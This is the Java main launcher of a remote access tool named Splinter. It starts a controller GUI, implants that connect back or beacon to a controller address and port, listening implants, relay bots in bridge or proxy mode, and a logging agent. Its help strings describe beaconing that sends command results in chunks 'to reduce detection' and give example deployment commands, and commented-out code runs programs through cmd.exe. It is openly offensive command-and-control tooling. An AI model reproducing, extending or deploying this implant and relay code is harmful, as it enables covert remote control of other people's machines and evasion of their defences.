/**
 * First class called.  Used to call main GUI thread
 * New boot loader coming soon!
 * 
 * @author Solomon Sonya 
 */




import java.io.File;

import javax.swing.JFileChooser;
import javax.swing.UIManager;

import Controller.*;
import Controller.Drivers.Drivers;
import Controller.GUI.*;
import Implant.Driver;
import Implant.Implant_ServerSocket;
import Implant.Splinter_IMPLANT;
import RelayBot.RelayBot_ServerSocket;



public class Main 
{
	
	//STARTUP OPTIONS
	public static final String STARTUP_LAUNCH_GUI_DELIMETER = "-g";
	public static final String STARTUP_DISPLAY_HELP_DELIMETER = "-h";
	public static final String STARTUP_IMPLANT_PERSISTENT_CONNECTION = "-i";
	public static final String STARTUP_IMPLANT_BEACON_ENABLED = "-b";
	public static final String STARTUP_IMPLANT_LISTEN_TO_ONLY_ONE_CONNECTION = "-l";
	public static final String STARTUP_ESTABLISH_RELAY_BOT = "-r";
	
	public static final String STARTUP_RELAY_BRIDGE_MODE = "-bridge";
	public static final String STARTUP_RELAY_PROXY_MODE = "-proxy";
	
	public static final String STARTUP_LOGGER_AGENT = "-loggie";
	public static final String STARTUP_EXECUTE_PROGRAM = "--e";
	
	
	//STARTUP HELP
	public static final String STARTUP_IMPLANT_BEACON_ENABLED_HELP = STARTUP_IMPLANT_BEACON_ENABLED + "\tTrue Beaconing. \n\t\tInspired by @armitagehacker, implant checks in with controller \n\t\tfor new commands to execute or to continue sleeping if no \n\t\tcommands are available.  Results are parsed and transmitted \n\t\tto controller in chunks to reduce detection.\n\t\tFormat: [Controller Addr] [Port] [Beacon Interval] [s/m/h] \n\t\te.g. splinter.exe -b 192.168.0.5 80 1 h";
	public static final String STARTUP_LAUNCH_GUI_HELP = STARTUP_LAUNCH_GUI_DELIMETER + "\tDisplay the User Interface (GUI)";
	public static final String STARTUP_DISPLAY_HELP_HELP = STARTUP_DISPLAY_HELP_DELIMETER + "\tDisplays help options";
	//public static final String STARTUP_LAUNCH_IMPLANT_HELP = STARTUP_IMPLANT_PERSISTENT_CONNECTION + "\tImplant mode. Maintains persistent connection to controller \n\t\tArguments: [Controller Addr] [Port] <Beacon interval (secs)>\n\t\t e.g. splinter.exe -i 192.168.0.5 80";
	public static final String STARTUP_LAUNCH_IMPLANT_BEACON_HELP = STARTUP_IMPLANT_PERSISTENT_CONNECTION + "\tImplant mode with optional beaconing. \n\t\tMaintains persistent connection to controller \n\t\tArguments: [Controller Addr] [Port] <beacon interval in secs>\n\t\tBeacon interval: 0-disabled, T5-immediately, [# secs]-otherwise\n\t\te.g. splinter.exe -i 192.168.0.5 80 T5";
	public static final String STARTUP_IMPLANT_LISTEN_TO_ONLY_ONE_CONNECTION_HELP = STARTUP_IMPLANT_LISTEN_TO_ONLY_ONE_CONNECTION + "\tArguments: [ServerSocket Port] \n\t\tListening mode. Accepts ONLY 1 connection from controller\n\t\te.g. splinter.exe -l 80";
	public static final String STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS_HELP = Driver.STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS + "\tListening mode. Accepts Multiple connections from controller(s) \n\t\tArguments: [ServerSocketPort] \n\t\te.g. splinter.exe -L 80";

	public static final String STARTUP_LOGGER_AGENT_HELP = STARTUP_LOGGER_AGENT + "\tLogging Agent.\n\t\tConnect logging agent to Controller to save a log of connection\n\t\ttraffic. NOTE: Logging agents are only intended for use \n\t\twith Controller User Intrefaces \n\t\te.g. splinter.exe -loggie [Controller Addr] [Port]";
	
	//public static final String STARTUP_ESTABLISH_RELAY_BOT_HELP = STARTUP_ESTABLISH_RELAY_BOT + "\tEstablish Relay Bot. Data from connected Implants will be \n\t\tpiped to listening controllers (or other Relay Bots)\n\t\tArguments: [ServerSocketPort] \n\t\tArguments: [ServerSocketPort] [Address to Relay] [Port to Relay]\t\te.g. splinter.exe -r 80 \n\t\te.g. splinter.exe -r 8080 127.0.0.1 80";
	
	public static final String STARTUP_RELAY_BRIDE_HELP = STARTUP_RELAY_BRIDGE_MODE + "\tRelay Bridge Mode. Multiple agents including Controllers ALL \n\t\tconnect to this relay bot. Relay bot will bridge agent \n\t\tand Controller sockets to each other\n\t\tArguments: [ServerSocketPort] \n\t\te.g. splinter.exe " + STARTUP_RELAY_BRIDGE_MODE + " 80 ";
	public static final String STARTUP_RELAY_PROXY_HELP = STARTUP_RELAY_PROXY_MODE + "\tRelay Proxy Mode. Multiple agents connect to this relay bot. \n\t\tRelay bot will proxy connection and establish outbound socket \n\t\tconnection to controller \n\t\tArguments: [ServerSocketPort] [Controller Addr] [Port] \n\t\te.g. splinter.exe " + STARTUP_RELAY_PROXY_MODE + " 80 192.168.0.5 80";
	//public static final String STARTUP_LAUNCH_EXE_HELP = STARTUP_EXECUTE_PROGRAM + "\tOnly applicable for Implants. \n\t\tLaunch Separate Process Upon Implant Execution \n\t\te.g. Splinter -b localhost 8080 --e iexplore";
	
	public static Splinter_GUI RAT;//GUI frame
	
	public static String execute_program = null;
	
	/**
	 * @param args
	 */
	public static void main(String[] args) 	
	{
		
		try 
		{	UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	}	catch (Exception e)		{   	}
		
		Driver.printConsoleWelcomeSplash(null);
		
		displayHelp();
		
		
		
		//determine the start method
		if(args == null || args.length < 1)
		{
			//START THE GUI
			// TODO Auto-generated method stub
			 RAT = new Splinter_GUI();//instantiation
			 RAT.setVisible(true);//show the GUI
		}
		else//params were passed in
		{
			//check if we're launching a process after we execute
			/*for(int i = 0; i < args.length; i++)
			{
				try
				{
					if(args[i] != null && args[i].trim().equalsIgnoreCase(STARTUP_EXECUTE_PROGRAM))
					{
						execute_program = "";
						
						for(int j = i+1; j < args.length; j++)
						{
							execute_program = execute_program + " " + args[j];
						}
					}
				}
				catch(Exception e)
				{
					continue;
				}
				
			}*/
						
			
			if(args[0] == null || args[0].equalsIgnoreCase(STARTUP_LAUNCH_GUI_DELIMETER))
			{
				 
				Controller.Drivers.Drivers.sop("Launching GUI");
				 RAT = new Splinter_GUI();//instantiation
				 RAT.setVisible(true);//show the GUI
			}
			
			else if(args[0].equalsIgnoreCase(STARTUP_DISPLAY_HELP_DELIMETER))
			{
				Main.displayHelp();
			}
			
			/*else if(args[0].equalsIgnoreCase(STARTUP_ESTABLISH_RELAY_BOT))
			{
				//expected format
				Main.initiateRelayBot(args);
			}*/
			
			else if(args[0].equalsIgnoreCase(STARTUP_IMPLANT_PERSISTENT_CONNECTION))
			{
				//expected format
				Main.initiateImplant_Persistent_Connection(args);
			}
			
			else if(args[0].equalsIgnoreCase(STARTUP_IMPLANT_BEACON_ENABLED))
			{				
				//Main.initiateImplant_Persistent_Connection(args);
				Main.initiateImplant_Beacon(args);
			}
			
			else if(args[0].equals(STARTUP_IMPLANT_LISTEN_TO_ONLY_ONE_CONNECTION))
			{
				//LISTENING MODE FOR ONLY ONE CONTROLLER
				//Main.initiateImplant_listen_single_connection(args);
			}
			
			else if(args[0].equals(Driver.STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS))
			{
				//LISTENING MODE FOR MULTIPLE CONNECTIONS
				Main.initiateImplant_listen_MULTIPLE_connections(args);
			}
			
			else if(args[0].equals(STARTUP_RELAY_BRIDGE_MODE))
			{
				Main.initiateRelayBot_Bridge(args);
			}
			
			else if(args[0].equals(STARTUP_RELAY_PROXY_MODE))
			{
				Main.initiateRelayBot_Proxy(args);
			}
			
			else if(args[0].equals(STARTUP_LOGGER_AGENT))
			{
				Main.initiateLoggingAgent(args);
			}
			
			else//unknown param entered
			{
				Main.displayHelp();
			}
		}
		
		//determine if starting a new program
		/*if(execute_program != null && !execute_program.trim().equals(""))
		{
			sop("Starting " + execute_program + "...");
			try
			{
				Process process = Runtime.getRuntime().exec("cmd.exe /C start " + "\"" + execute_program + "\"", null, new File("."));
			}
			catch(Exception e)
			{
				sop("could not start process!!!");
			}
		}*/
	}
	
	
	/*public static boolean initiateRelayBot(String [] arg)
	{
		try
		{						
			//	[0] == -r
			//	[1] == ServerSocket Port
			//	[2] == Optional Address to Controller
			//	[3] == Optional Port to Controller
			
			int PORT = Integer.parseInt(arg[1]);
			
			if(PORT < 1 || PORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}
			
			if(arg.length < 3)
			{
				//only establish serversocket, no forward connections will be enabled
				RelayBot_ServerSocket relayServerSocket = new RelayBot_ServerSocket(PORT, " ", 80, false);
				relayServerSocket.start();
			}
			
			else
			{
				int controllerPORT = Integer.parseInt(arg[3]);
				
				if(controllerPORT < 1 || controllerPORT > 65534)
				{
					System.out.print("Port out of range!!!!  ");
					throw new Exception("port out of range");
				}
				
				RelayBot_ServerSocket relayServerSocket = new RelayBot_ServerSocket(PORT, arg[2], controllerPORT, true);
				relayServerSocket.start();
			}
						
			
			return true;
		}
		catch(Exception e)
		{
			sop("Invalid input specified to initiate Relay Bot. Unable to continue...\n");
			sop(Main.STARTUP_ESTABLISH_RELAY_BOT_HELP);
			System.exit(0);
		}
		
		return false;
	}*/
	
	public static boolean initiateLoggingAgent(String [] arg)
	{
		try
		{			
			//  [0] == -loggie
			//	[1] == Address to Controller
			//	[2] == Port to Controller

			int PORT = Integer.parseInt(arg[2]);

			String controllerAddress = arg[1];				

			if(PORT < 1 || PORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}

			//query user for save top folder
			File loogingDirectoryTopFolder = Driver.querySelectFile(false, "Please Select the Directory to save log files", JFileChooser.DIRECTORIES_ONLY, false, false);
			
			if(loogingDirectoryTopFolder == null || !loogingDirectoryTopFolder.exists() || !loogingDirectoryTopFolder.isDirectory())
			{
				throw new Exception("Invalid log directory specified");
			}
			
			Splinter_LOGGIE loggie = new Splinter_LOGGIE(controllerAddress, PORT, loogingDirectoryTopFolder.getCanonicalPath());

			

			return true;
		}
		catch(Exception e)
		{
			
			
		}
		
		Driver.sop("\nInvalid input specified for logging agent!!!");
		Driver.sop("\t" + STARTUP_LOGGER_AGENT_HELP);
		System.exit(0);
		
		
		return false;
	}
	
	public static boolean initiateImplant_listen_single_connection(String [] arg)
	{
		try
		{
			//[Controller IP] [Port] [minutes before auto-reconnect(beacon interval). 0 to disable]";
			//Just try and take the input.. if it fails in anyway, then we know the user did not provide input expected
			
			//	[0] == -l
			//	[1] == ServerSocket Port
			
			int PORT = Integer.parseInt(arg[1]);
			
			if(PORT < 1 || PORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}
			
			Implant_ServerSocket serverSocket = new Implant_ServerSocket(PORT, false);
			serverSocket.start();
			
			return true;
		}
		catch(Exception e)
		{
			sop("Invalid input specified to initiate ServerSocket. Unable to continue...");
			sop(Main.STARTUP_IMPLANT_LISTEN_TO_ONLY_ONE_CONNECTION_HELP);
			System.exit(0);
		}
		
		return false;
	}
	
	
	public static boolean initiateImplant_Persistent_Connection(String [] arg)
	{
		try
		{
			//[Controller IP] [Port] [minutes before auto-reconnect(beacon interval). 0 to disable]";
			//Just try and take the input.. if it fails in anyway, then we know the user did not provide input expected
			
			//	[0] == -i
			//	[1] == Address to Controller
			//	[2] == Port to Controller
			//	[3] == Beacon interval (in mins to re-establish connection with )
			
			String address = arg[1];
			int PORT = Integer.parseInt(arg[2]);
			int beaconInterval_secs = 0;
			
			if(arg.length != 3)//then we expect beacon to be disabled, thus, there's no time interval flag specified
			{
				//just 3 arg's is expected if beaconing is disabled. [-i][addr to controller][port]
				//but if it's 4, then we also have a beacon interval [-b][addr to controller][port][beacon interval]
				
				//now check if user chose T5 as the timing option, if so, just enable rapid/immediate reconnection
				if(arg[3].trim().equalsIgnoreCase("T5"))
				{
					beaconInterval_secs = 1;
				}
				else//take the number value user entered
				{
					beaconInterval_secs = Integer.parseInt(arg[3]);
				}
				
			}
			
			
			boolean beacon = false;
			boolean beaconImmediately = false;
			
			if(address == null || address.trim().equals(""))
			{
				System.out.print("address to Controller not set!!!"  );
				throw new Exception("address to Controller not set!!!"  );
			}
			
			if(PORT < 1 || PORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}
			
			if(beaconInterval_secs < 0)
			{
				System.out.print("Beacon Interval out of range!!!   ");
				throw new Exception("beacon inteval out of range");
			}
			
			if(beaconInterval_secs == 0)
			{
				beacon = false;
				beaconImmediately = false;
			}
			else if(beaconInterval_secs == 1)
			{
				beacon = true;		
				beaconImmediately = true;
			}
			else//specify the interval in millisecs
			{
				beaconInterval_secs *= 1000;
				
				beacon = true;		
				beaconImmediately = false;
			}
			
			//(String , int , boolean enableBeaconingUponDisconnection, boolean reconnectImmediatelyUponDisconnection, int beaconIntvl_millis)
			
			//ready to call implant!!!!!
			Splinter_IMPLANT implant = new Splinter_IMPLANT(address, PORT, beacon, beaconImmediately, beaconInterval_secs);
			implant.start();
			
			return true;
		}
		catch(Exception e)
		{
			sop("\nInvalid input specified to initiate implant. Unable to continue...");
			//sop(STARTUP_LAUNCH_IMPLANT_HELP);
			sop("\t" + STARTUP_LAUNCH_IMPLANT_BEACON_HELP);
			System.exit(0);
		}
		
		return false;
	}
	
	public static boolean initiateRelayBot_Bridge(String [] arg)
	{
		try
		{
			
			//  [0] == -bridge
			//	[1] == ServerSocket Port

			int PORT = Integer.parseInt(arg[1]);
			
			
			if(PORT < 1 || PORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}

			//Very simple from this point, start a start serversocket thread in proxy mode, the server socket and terminal thread will handle the rest
			RelayBot_ServerSocket bridgeBot = new RelayBot_ServerSocket(true, false, PORT, "", 0);
			bridgeBot.start();

			
			return true;
		}
		catch(Exception e)
		{
			//Drivers.eop("initiateRelayBot_Bridge", "Main", e, "", false);
			Drivers.sop("Relay bot Bridging Mode Invalid Input!!!");
		}
		
		return false;
	}
	
	public static boolean initiateImplant_Beacon(String [] arg) 
	{
		try
		{
			//[Controller IP] [Port] [seconds before auto-reconnect(beacon interval)]";
			//Just try and take the input.. if it fails in anyway, then we know the user did not provide input expected
			
			//	[0] == -b
			//	[1] == Address to Controller
			//	[2] == Port to Controller
			//	[3] == Beacon interval number
			//  [4] == Beacon interval timing option: s/m/h for secs, mins, or hours
			
			//
			//CONTROLLER ADDRESS
			//
			String address = arg[1];
			
			//
			//CONTROLLER PORT
			//
			int PORT = Integer.parseInt(arg[2]);
			
			//
			//BEACON INTERVAL
			//
			int beaconInterval_secs = 0;
			
			//now check if user chose T5 as the timing option, if so, just enable rapid/immediate reconnection
			if(arg[3].trim().equalsIgnoreCase("T5"))
			{
				beaconInterval_secs = 1;
			}
			else//take the number value user entered
			{
				beaconInterval_secs = Integer.parseInt(arg[3]);
			}
			
			
			boolean beacon = true;
			boolean beaconImmediately = false;
			
			if(address == null || address.trim().equals(""))
			{
				System.out.print("address to Controller not set!!!"  );
				throw new Exception("address to Controller not set!!!"  );
			}
			
			if(PORT < 1 || PORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}
			
			if(beaconInterval_secs < 0)
			{
				System.out.print("Beacon Interval out of range!!!   ");
				throw new Exception("beacon inteval out of range");
			}
			
			if(beaconInterval_secs < 2)
			{
				beaconInterval_secs = 1;
			}
			else if(beaconInterval_secs == 1)
			{
				beacon = true;		
				beaconImmediately = true;
			}
			
			//
			//BEACON INTERVAL TIMING OPTION
			//
			String timingOption = arg[4].trim();
			int factor = 1000;
			
			if(timingOption.equalsIgnoreCase("s") || timingOption.equalsIgnoreCase("sec") || timingOption.equalsIgnoreCase("secs") || timingOption.equalsIgnoreCase("second") || timingOption.equalsIgnoreCase("seconds"))
			{
				factor = 1000;
			}
			
			else if(timingOption.equalsIgnoreCase("m") || timingOption.equalsIgnoreCase("min") || timingOption.equalsIgnoreCase("mins") || timingOption.equalsIgnoreCase("minute") || timingOption.equalsIgnoreCase("minutes"))
			{
				factor = 1000 * 60;
			}
			
			else if(timingOption.equalsIgnoreCase("h") || timingOption.equalsIgnoreCase("hr") || timingOption.equalsIgnoreCase("hrs") ||timingOption.equalsIgnoreCase("hour") || timingOption.equalsIgnoreCase("hours"))
			{
				factor = 1000 * 60 * 60;
			}
			
			else if(timingOption.equalsIgnoreCase("d") || timingOption.equalsIgnoreCase("dy") || timingOption.equalsIgnoreCase("day") || timingOption.equalsIgnoreCase("days"))
			{
				factor = 1000 * 60 * 60 * 24;
			}
			
			else if(timingOption.equalsIgnoreCase("w") || timingOption.equalsIgnoreCase("wk") || timingOption.equalsIgnoreCase("wks") || timingOption.equalsIgnoreCase("week") || timingOption.equalsIgnoreCase("weeks"))
			{
				factor = 1000 * 60 * 60 * 24 * 7;
			}
			
			else if(timingOption.equalsIgnoreCase("mo") || timingOption.equalsIgnoreCase("mos") || timingOption.equalsIgnoreCase("month") || timingOption.equalsIgnoreCase("months"))
			{
				factor = 1000 * 60 * 60 * 24 * 7 * 4;
			}
			
			else if(timingOption.equalsIgnoreCase("y") || timingOption.equalsIgnoreCase("yr") || timingOption.equalsIgnoreCase("year") || timingOption.equalsIgnoreCase("years"))
			{
				factor = 1000 * 60 * 60 * 24 * 7 * 4 * 12;
			}
			
			beaconInterval_secs *= factor;
			
			Driver.sop("Starting beacon implant for : " + beaconInterval_secs/1000 + "second intervals");
			
			//(String , int , boolean enableBeaconingUponDisconnection, boolean reconnectImmediatelyUponDisconnection, int beaconIntvl_millis)
			
			//ready to call implant!!!!!
			Splinter_IMPLANT implant = new Splinter_IMPLANT(address, PORT, beaconInterval_secs);
			implant.i_am_beacon_implant = true;
			implant.start();
			
			return true;
		}
		catch(Exception e)
		{
			sop("\nInvalid input specified to initiate implant. Unable to continue...");
			//sop(STARTUP_LAUNCH_IMPLANT_HELP);
			sop("\t" + STARTUP_IMPLANT_BEACON_ENABLED_HELP);
			System.exit(0);
		}
		
		return false;
	}
	
	public static boolean initiateImplant_listen_MULTIPLE_connections(String [] arg)
	{
		try
		{
			//[Controller IP] [Port] [minutes before auto-reconnect(beacon interval). 0 to disable]";
			//Just try and take the input.. if it fails in anyway, then we know the user did not provide input expected
			
			//	[0] == -L
			//	[1] == ServerSocket Port
			
			int PORT = Integer.parseInt(arg[1]);
			
			if(PORT < 1 || PORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}
			
			
			
			
			Implant_ServerSocket serverSocket = new Implant_ServerSocket(PORT, true);
			serverSocket.start();
			
			return true;
		}
		catch(Exception e)
		{
			sop("Invalid input specified to initiate ServerSocket. Unable to continue...");
			sop(Main.STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS_HELP);
			System.exit(0);
		}
		
		return false;
	}
	
	
	public static boolean initiateRelayBot_Proxy(String [] arg)
	{
		try
		{
			
			//  [0] == -proxy
			//	[1] == ServerSocket Port
			//	[2] == Address to Controller
			//	[3] == Port to Controller

			int PORT = Integer.parseInt(arg[1]);
			
			String controllerAddress = arg[2];				

			if(PORT < 1 || PORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}
			
			int controllerPORT = Integer.parseInt(arg[3]);

			if(controllerPORT < 1 || controllerPORT > 65534)
			{
				System.out.print("Port out of range!!!!  ");
				throw new Exception("port out of range");
			}

			//Very simple from this point, start a start serversocket thread in proxy mode, the server socket and terminal thread will handle the rest
			RelayBot_ServerSocket proxyBot = new RelayBot_ServerSocket(false, true, PORT, controllerAddress, controllerPORT);
			proxyBot.start();

			
			return true;
		}
		catch(Exception e)
		{
			//Drivers.eop("initiateRelayBot_Bridge", "Main", e, "", false);
			Drivers.sop("Relay bot Proxy Mode Invalid Input!!!");
		}
		
		return false;
	}
	
	
	public static void displayHelp()
	{
		sop("OPTIONS:\n");
		sop("\n\t" + STARTUP_LAUNCH_GUI_HELP);
		sop("\n\t" + STARTUP_DISPLAY_HELP_HELP);
		//sop("\n\t" + STARTUP_LAUNCH_IMPLANT_HELP);
		sop("\n\t" + STARTUP_LAUNCH_IMPLANT_BEACON_HELP);
		sop("\n\t" + STARTUP_IMPLANT_BEACON_ENABLED_HELP);
		//sop("\n\t" + STARTUP_IMPLANT_LISTEN_TO_ONLY_ONE_CONNECTION_HELP);
		sop("\n\t" + STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS_HELP);
		//sop("\n\t" + STARTUP_LAUNCH_EXE_HELP);
		//sop("\n\t" + STARTUP_ESTABLISH_RELAY_BOT_HELP);
		sop("\n\t" + STARTUP_RELAY_BRIDE_HELP);
		sop("\n\t" + STARTUP_RELAY_PROXY_HELP);
		sop("\n\t" + STARTUP_LOGGER_AGENT_HELP);
		sop("");
	}

	public static void sop(String out)
	{
		System.out.println(out);
	}
}
